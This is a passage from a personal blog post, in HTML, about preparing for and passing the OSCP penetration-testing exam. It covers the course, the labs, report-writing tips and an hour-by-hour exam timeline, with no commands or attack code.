+<p><strong>OffSec Course (for those who purchased it)</strong> - In my opinion the course is sufficient but not complete; some content you'll need to find externally on HTB/THM:<br/><a href="https://www.offsec.com/courses/pen-200/" rel="noopener" target="_blank">https://www.offsec.com/courses/pen-200/</a></p>
+<figure>
+<img alt="" loading="lazy" src="https://cdn-images-1.medium.com/max/600/0*cyNjQR-EBc0vVL8D.png"/>
+</figure>
+<figure>
+<img alt="" loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*_qn9VIiB7TTSlCpZBiZp_g.png"/>
+<figcaption>PEN 200 Course</figcaption>
+</figure>
+<p>OSCP Challenge Labs - don't skip the <strong>OSCP ABC</strong> challenges. They practice Initial Access, Pivot, Privilege Escalation, and much more.</p>
+<figure>
+<img alt="" loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*DPIgSXgAkvoApOdvz12U_Q.png"/>
+<figcaption>Challenge Labs</figcaption>
+</figure>
+<h2>6. Report Writing (Don't Overlook This)</h2>
+<figure>
+<img alt="" loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*JA0gHDolqFFnRQhmQ7KAAg.png"/>
+<figcaption>Example of correct screenshot format</figcaption>
+</figure>
+<ul>
+<li>The report is a <strong>condition for passing</strong> - if you can exploit but can't write, you fail.</li>
+</ul>
+<p>OSCP gives you 24 hours after the exam ends to write and submit your report. Before the exam ends, verify that your screenshots meet OffSec's requirements - e.g., have you run ipconfig? Is your shell interactive? Did you cat the flag? Is the flag visible in the console?</p>
+<figure>
+<img alt="" loading="lazy" src="https://cdn-images-1.medium.com/max/800/0*RqTMqy8MmFVDPXR4.jpg"/>
+</figure>
+<ul>
+<li>Practice writing from the lab stage - include: steps, commands, screenshots, impact, remediation. More details: <a href="https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide#screenshot-requirements" rel="noopener" target="_blank">https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide#screenshot-requirements</a></li>
+<li>Use Markdown/Word template → export to PDF: <a href="https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide#suggested-documentation-templates" rel="noopener" target="_blank">https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide#suggested-documentation-templates</a></li>
+</ul>
+<h2>7. My Exam Timeline (Use as a Guideline)</h2>
+<p><strong>Timeline</strong><br/>07:00 Wake up and refresh<br/>08:00 Breakfast, exam preparation<br/>09:00 Call family for good luck blessings<br/>09:45 Log into Proctor system for identity verification<br/>10:05 Exam started (slightly delayed due to system issue)<br/>10:20 Start VPN, verify machine readiness per Proctor guidance<br/>10:25 Check exam targets and start timers</p>
+<p><strong>Active Directory (1 Domain Controller and 2 Clients)</strong><br/>10:30 Begin Recon and Enum, AD machines only<br/>11:00 Found entry point for first AD machine<br/>12:00 Got user flag AD machine 1 (<strong>0 points</strong>)<br/>12:30 Got Administrator flag AD machine 1 (<strong>0 points</strong>)<br/>12:45 Got info for AD machine 2 (<strong>0 points</strong>)<br/>13:00 Accessed AD machine 2 (<strong>0 points</strong>)<br/>13:30 Lunch break<br/>14:00 Continue AD machine 2 (<strong>0 points</strong>)<br/>14:30 Got user flag AD machine 2 (<strong>0 points</strong>)<br/>14:45 Got Administrator flag machine 2 (<strong>0 points</strong>)<br/>14:50 Accessed final AD machine (Domain Controller)<br/>15:00 Got Administrator flag of Domain Controller (<strong>40 points</strong>)</p>
+<p>At this point I had <strong>40 points</strong>. Took a short break and switched timers to Standalone.</p>
+<p><strong>Standalone (3 Machines)</strong><br/>16:00 Began Recon and Enum on machine 1<br/>16:20 Found it was the same machine I couldn't solve last round<br/>16:30 Switched to other machines<br/>18:00 Found entry to machine 2 (after a rabbit hole)<br/>18:30 Dinner break<br/>19:30 Recon and Enum machines 2 and 3<br/>20:30 Got enumeration data, preparing entry<br/>20:50 Found entry to machine 2<br/>21:00 Back to machine 1 - remembered <strong>Enum is Key</strong>, re-enumerated more thoroughly<br/>22:00 After thorough enumeration, finally found the entry<br/>22:30 Got user flag machine 1 (<strong>50 points</strong>)<br/>22:45 Privilege Escalation machine 1<br/>23:00 Got root flag machine 1 (<strong>60 points</strong>)<br/>23:15 Accessed machine 2<br/>23:30 Got user flag machine 2 (<strong>70 points</strong>)<br/>At this point I could have stopped - but the fighter's spirit pushed me forward.<br/>00:00 Got root flag machine 2 (<strong>80 points</strong>)</p>
+<h2>Build Your Confidence</h2>
+<ol>
+<li>Believe in yourself that you can do it</li>
+<li>Keep notes nearby during the exam - Notion / Obsidian / Gitbook / Joplin to store commands</li>
+<li><strong>Enum is Key *****</strong></li>
+</ol>
+<figure>
+<img alt="" loading="lazy" src="https://cdn-images-1.medium.com/max/800/0*FZT9AAQlK0VO7ure.jpg"/>
+</figure>
+<h2>8. The "Worry-Free" Mindset - From Those Who've Passed</h2>
+<figure>
+<img alt="" loading="lazy" src="https://cdn-images-1.medium.com/max/800/0*QhQEI6aSdney6LcG.jpg"/>
+</figure>
+<p>Now that you've reached this point, it's time to set your goal and conquer the OSCP you've always dreamed of. I hope this blog is helpful in some way. Good luck to everyone!</p>
+<h2><strong>- - - Good Luck and Try Harder (Pay Harder) - - -</strong></h2>
+<figure>
+<img alt="" loading="lazy" src="https://cdn-images-1.medium.com/max/800/0*nCaoD19US9UlH4Zt.jpg"/>
+</figure>
+<blockquote><strong>Profile</strong></blockquote>
+<blockquote><strong>Blog author Sabastiaz<br/>Medium</strong>: <a href="https://medium.com/@sabastiaz" rel="noopener" target="_blank">https://medium.com/@sabastiaz</a><br/><strong>Linkedin: </strong><a href="https://www.linkedin.com/in/ratthapong-sommanus-465b661b2/" rel="noopener" target="_blank">https://www.linkedin.com/in/ratthapong-sommanus-465b661b2/</a></blockquote>
+<blockquote><strong>Chicken0248</strong><br/><strong>Medium</strong>: <a href="https://medium.com/@chaoskist" rel="noopener" target="_blank">https://medium.com/@chaoskist</a><br/><strong>Linkedin: </strong><a href="https://www.linkedin.com/in/warawut-manosong/" rel="noopener" target="_blank">https://www.linkedin.com/in/warawut-manosong/</a></blockquote>
+<blockquote><strong>Boeing777<br/>Medium</strong>: <a href="https://medium.com/@_boeing777" rel="noopener" target="_blank">https://medium.com/@_boeing777</a><br/><strong>Linkedin: </strong><a href="https://www.linkedin.com/in/itthidej-a-214184234/" rel="noopener" target="_blank">https://www.linkedin.com/in/itthidej-a-214184234/</a></blockquote>
+<blockquote><strong>Prawee<br/>Linkedin: </strong><a href="https://www.linkedin.com/in/prawee-lertprasertphan/" rel="noopener" target="_blank">https://www.linkedin.com/in/prawee-lertprasertphan/</a></blockquote>
+</div>
+<div class="share-section">
+<span class="share-label">แชร์บทความนี้</span>
+<div class="share-buttons">
+<a class="share-btn share-x" href="#" rel="noopener noreferrer" target="_blank">
+<svg fill="currentColor" height="14" viewbox="0 0 24 24" width="14"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-4.714-6.231-5.401 6.231H2.742l7.733-8.835L1.254 2.25H8.08l4.253 5.622zm-1.161 17.52h1.833L7.084 4.126H5.117z"></path></svg>
+          X / Twitter
+        </a>
+<a class="share-btn share-li" href="#" rel="noopener noreferrer" target="_blank">
+<svg fill="currentColor" height="14" viewbox="0 0 24 24" width="14"><path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433a2.062 2.062 0 0 1-2.063-2.065 2.064 2.064 0 1 1 2.063 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"></path></svg>
+          LinkedIn
+        </a>
+<a class="share-btn share-fb" href="#" rel="noopener noreferrer" target="_blank">
+<svg fill="currentColor" height="14" viewbox="0 0 24 24" width="14"><path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"></path></svg>
+          Facebook
+        </a>
+<button class="share-btn share-copy" onclick="copyLink(this)">
+<svg fill="none" height="14" stroke="currentColor" stroke-width="2" viewbox="0 0 24 24" width="14"><rect height="13" rx="2" ry="2" width="13" x="9" y="9"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
+<span>Copy Link</span>
+</button>
+</div>
+</div>
+<div class="post-footer">
+<div class="author-card">
+<img alt="Sabastiaz" class="author-avatar" src="../pic/Sabastiaz_Sly.png"/>
+<div>
+<div class="author-name">Sabastiaz</div>
+<div class="author-creds">Red Team Sorcerer | OSEP | OSCP | CAPE | CPTS | CRTO | C-ADPenX | Tenable.VM Specialist | Tenable Guardian Thailand</div>
+</div>
+</div>
+<div class="post-navlinks">
+<a class="post-navlink prev" href="achievement-2025.html"><span class="post-navlink-label">← Previous</span><span class="post-navlink-title">Achievement 2025</span></a>
+<a class="post-navlink next" href="ctf-fun-th.html"><span class="post-navlink-label">Next →</span><span class="post-navlink-title">ความยากที่พอดี คือความสนุกของ CTF</span></a>
+</div>
+<a class="post-back" href="../writings.html">← Back to Tomes</a>
+</div>
+</div>
+</div>
+<script src="../stars.js"></script>
+<script>
+  const ham=document.getElementById('nav-hamburger');
+  const ul=document.querySelector('.nav-links');
+  if(ham)ham.addEventListener('click',()=>{
+    const open=ham.getAttribute('aria-expanded')==='true';
+    ham.setAttribute('aria-expanded',String(!open));
+    ul.classList.toggle('open',!open);
+  });
+</script>
+<script src="../notif.js"></script>
+<script>
+(function(){
+  var u=encodeURIComponent(location.href);
+  var t=encodeURIComponent(document.title);
+  var x=document.querySelector('.share-x');
+  var li=document.querySelector('.share-li');
+  var fb=document.querySelector('.share-fb');
+  if(x)x.href='https://twitter.com/intent/tweet?url='+u+'&text='+t;
+  if(li)li.href='https://www.linkedin.com/sharing/share-offsite/?url='+u;
+  if(fb)fb.href='https://www.facebook.com/sharer/sharer.php?u='+u;
+})();
+function copyLink(btn){
+  navigator.clipboard.writeText(location.href).then(function(){
+    var span=btn.querySelector('span');
+    span.textContent='✓ Copied!';
+    btn.style.color='var(--gold)';
+    btn.style.borderColor='var(--gold)';
+    setTimeout(function(){span.textContent='Copy Link';btn.style.color='';btn.style.borderColor='';},2000);
+  });
+}
+</script>
+<script>
+(function(){
+  var pill=document.getElementById('lang-pill');
+  if(!pill)return;
+  var m=document.documentElement.className.match(/lang-(\w+)/);
+  var lang=m?m[1]:'th';
+  function set(l){
+    document.documentElement.classList.remove('lang-th','lang-en');
+    document.documentElement.classList.add('lang-'+l);
+    localStorage.setItem('siteLang',l);
+    pill.querySelector('.lang-th').classList.toggle('active',l==='th');
+    pill.querySelector('.lang-en').classList.toggle('active',l==='en');
+  }
+  pill.querySelector('.lang-th').addEventListener('click',function(e){e.preventDefault();set('th');});
+  pill.querySelector('.lang-en').addEventListener('click',function(e){e.preventDefault();set('en');});
+  set(lang);
+})();
+</script>
+
+<button id="back-to-top" aria-label="Back to top">↑</button>
+<script>
+(function(){
+  var btn=document.getElementById('back-to-top');
+  window.addEventListener('scroll',function(){btn.classList.toggle('visible',window.scrollY>300);},{passive:true});
+  btn.addEventListener('click',function(){window.scrollTo({top:0,behavior:'smooth'});});
+})();
+</script>
+<script data-goatcounter="https://sabastiaz.goatcounter.com/count" async src="//gc.zgo.at/count.js"></script>
+</body>
+</html>
